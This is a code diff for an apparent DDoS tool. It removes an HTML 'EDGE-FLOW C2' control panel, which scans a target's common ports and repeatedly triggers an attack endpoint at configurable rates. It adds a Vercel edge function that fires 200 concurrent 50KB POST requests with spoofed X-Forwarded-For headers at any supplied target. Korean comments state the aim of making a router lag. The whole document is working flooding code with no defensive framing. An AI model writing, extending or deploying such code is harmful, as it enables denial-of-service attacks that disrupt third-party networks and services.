@@ -1,141 +1,27 @@
-<!DOCTYPE html>
-<html lang="ko">
-<head>
-    <meta charset="UTF-8">
-    <title>⚡ VERCEL EDGE COMMANDER v4.0</title>
-    <style>
-        :root { --neon: #00ff41; --bg: #050505; --warn: #ff3e3e; --scan: #00d4ff; }
-        body { background: var(--bg); color: var(--neon); font-family: 'Courier New', monospace; margin: 0; padding: 20px; display: flex; flex-direction: column; height: 100vh; overflow: hidden; }
-        .header { border-bottom: 2px solid var(--neon); padding-bottom: 10px; margin-bottom: 20px; text-shadow: 0 0 10px var(--neon); }
-        .controls { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; background: #111; padding: 20px; border: 1px solid #333; border-radius: 10px; }
-        .full-width { grid-column: span 2; }
-        label { display: block; margin-bottom: 5px; font-size: 0.8em; color: #888; }
-        input, select { background: #000; border: 1px solid var(--neon); color: var(--neon); padding: 12px; width: 100%; box-sizing: border-box; font-size: 1.1em; outline: none; }
-        .btn-group { display: flex; gap: 10px; margin-top: 20px; }
-        button { flex: 1; padding: 15px; font-weight: bold; cursor: pointer; border: none; transition: 0.3s; font-size: 1em; }
-        #startBtn { background: var(--neon); color: #000; }
-        #stopBtn { background: var(--warn); color: #fff; opacity: 0.5; cursor: not-allowed; }
-        #terminal { flex-grow: 1; background: #000; border: 1px solid #222; margin-top: 20px; padding: 15px; overflow-y: auto; font-size: 12px; border-radius: 5px; }
-        .log-entry { margin-bottom: 4px; border-left: 3px solid var(--neon); padding-left: 8px; animation: scan 0.2s ease-out; }
-        .log-err { color: var(--warn); border-left-color: var(--warn); }
-        .log-scan { color: var(--scan); border-left-color: var(--scan); }
-        @keyframes scan { from { opacity: 0; transform: translateX(-10px); } to { opacity: 1; transform: translateX(0); } }
-        .stats { display: flex; justify-content: space-between; margin-top: 10px; font-size: 0.9em; color: #888; }
-    </style>
-</head>
-<body>
-    <div class="header">
-        <h1>[ EDGE-FLOW C2 v4.0 - AUTO LOCK-ON ]</h1>
-        <div class="stats">
-            <span>STATUS: <span id="statusText">READY</span></span>
-            <span>TOTAL SHOTS: <span id="shotCount">0</span></span>
-        </div>
-    </div>
+export const config = { runtime: 'edge' };
 
-    <div class="controls">
-        <div class="full-width">
-            <label>TARGET IP / DOMAIN (NO PORT)</label>
-            <input type="text" id="target" value="http://" placeholder="http://1.2.3.4">
-        </div>
-        <div>
-            <label>FIRE RATE (ms)</label>
-            <select id="rate">
-                <option value="100" selected>Turbo (100ms)</option>
-                <option value="50">INSANE (50ms)</option>
-            </select>
-        </div>
-        <div>
-            <label>POWER (THREADS)</label>
-            <select id="threads">
-                <option value="5">Medium (5x)</option>
-                <option value="10" selected>High (10x)</option>
-            </select>
-        </div>
-    </div>
+export default async function handler(req) {
+  const { searchParams } = new URL(req.url);
+  const target = searchParams.get('target');
+  if (!target) return new Response("TARGET_MISSING");
 
-    <div class="btn-group">
-        <button id="startBtn" onclick="initiateScan()">SCAN & FIRE</button>
-        <button id="stopBtn" onclick="terminate()">EMERGENCY STOP</button>
-    </div>
+  // [핵심] 패킷 하나당 용량을 100배로 키웁니다 (더미 데이터 생성)
+  // 공유기가 이 거대한 데이터를 읽다가 렉이 걸리게 만듭니다.
+  const heavyPayload = new TextEncoder().encode("X".repeat(50000)); // 약 50KB의 묵직한 탄환
 
-    <div id="terminal">>> SYSTEM STANDBY...</div>
+  const attack = Array.from({ length: 200 }).map(() => 
+    fetch(target, {
+      method: 'POST', // GET보다 훨씬 무거운 POST 방식 사용
+      body: heavyPayload,
+      mode: 'no-cors',
+      headers: { 
+        'Content-Type': 'application/octet-stream',
+        'Cache-Control': 'no-cache',
+        'X-Forwarded-For': `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.1.1` 
+      }
+    }).catch(() => {})
+  );
 
-    <script>
-        let attackInterval = null;
-        let totalShots = 0;
-        const commonPorts = [80, 443, 8080, 8443, 1900, 5000, 8888];
-
-        function log(msg, type = 'info') {
-            const term = document.getElementById('terminal');
-            const div = document.createElement('div');
-            div.className = `log-entry ${type === 'error' ? 'log-err' : type === 'scan' ? 'log-scan' : ''}`;
-            div.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
-            term.prepend(div);
-            if (term.childNodes.length > 50) term.removeChild(term.lastChild);
-        }
-
-        async function initiateScan() {
-            const target = document.getElementById('target').value.replace(/\/$/, "");
-            if (!target.startsWith('http')) { log("ERROR: PROTOCOL MISSING", "error"); return; }
-
-            toggleButtons(true);
-            log(`🔍 SCANNING VULNERABLE PORTS ON ${target}...`, "scan");
-
-            let openPorts = [];
-            await Promise.all(commonPorts.map(async (port) => {
-                try {
-                    const controller = new AbortController();
-                    const timeout = setTimeout(() => controller.abort(), 2000);
-                    await fetch(`${target}:${port}`, { mode: 'no-cors', signal: controller.signal });
-                    log(`[FOUND] PORT ${port} RESPONDING`, "scan");
-                    openPorts.push(port);
-                } catch (e) { /* closed */ }
-            }));
-
-            if (openPorts.length === 0) {
-                log("NO SPECIFIC PORTS FOUND. TARGETING DEFAULT HTTP.", "error");
-                openPorts.push(80);
-            }
-
-            startAttack(target, openPorts);
-        }
-
-        function startAttack(base, ports) {
-            const rate = parseInt(document.getElementById('rate').value);
-            const threads = parseInt(document.getElementById('threads').value);
-            
-            document.getElementById('statusText').innerText = "LOCK-ON FIRING";
-            document.getElementById('statusText').style.color = "red";
-            log(`🚀 MISSION STARTED: MULTI-PORT FLOODING ON [${ports.join(", ")}]`);
-
-            attackInterval = setInterval(() => {
-                ports.forEach(port => {
-                    for(let i=0; i < threads; i++) {
-                        fetch(`/api/attack?target=${encodeURIComponent(base + ":" + port)}?cb=${Math.random()}`)
-                            .then(() => {
-                                totalShots += 1000;
-                                document.getElementById('shotCount').innerText = totalShots.toLocaleString();
-                                log(`SUCCESS: 1K PKTS -> PORT ${port}`);
-                            }).catch(() => {});
-                    }
-                });
-            }, rate);
-        }
-
-        function toggleButtons(running) {
-            document.getElementById('startBtn').disabled = running;
-            document.getElementById('startBtn').style.opacity = running ? "0.5" : "1";
-            document.getElementById('stopBtn').disabled = !running;
-            document.getElementById('stopBtn').style.opacity = running ? "1" : "0.5";
-        }
-
-        function terminate() {
-            clearInterval(attackInterval);
-            toggleButtons(false);
-            document.getElementById('statusText').innerText = "READY";
-            document.getElementById('statusText').style.color = "var(--neon)";
-            log("!!! MISSION ABORTED !!!", "error");
-        }
-    </script>
-</body>
-</html>
+  await Promise.all(attack);
+  return new Response("HEAVY_BOMBARDMENT_COMPLETE");
+}
